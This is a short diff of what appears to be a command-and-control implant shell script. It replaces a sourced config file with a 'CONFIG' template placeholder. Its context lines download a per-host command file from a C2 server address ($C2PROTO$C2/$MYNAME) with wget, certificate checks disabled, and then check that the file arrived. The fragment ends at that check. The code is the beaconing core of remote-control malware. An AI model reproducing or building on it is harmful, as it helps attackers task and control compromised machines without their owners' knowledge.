@@ -9,7 +9,7 @@
 ############################################################################### 
 
 
-source config.sh
+CONFIG
 
 $WGET -O $LOKIHOME/$MYNAME-command.txt --no-check-certificate $C2PROTO$C2/$MYNAME
 if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
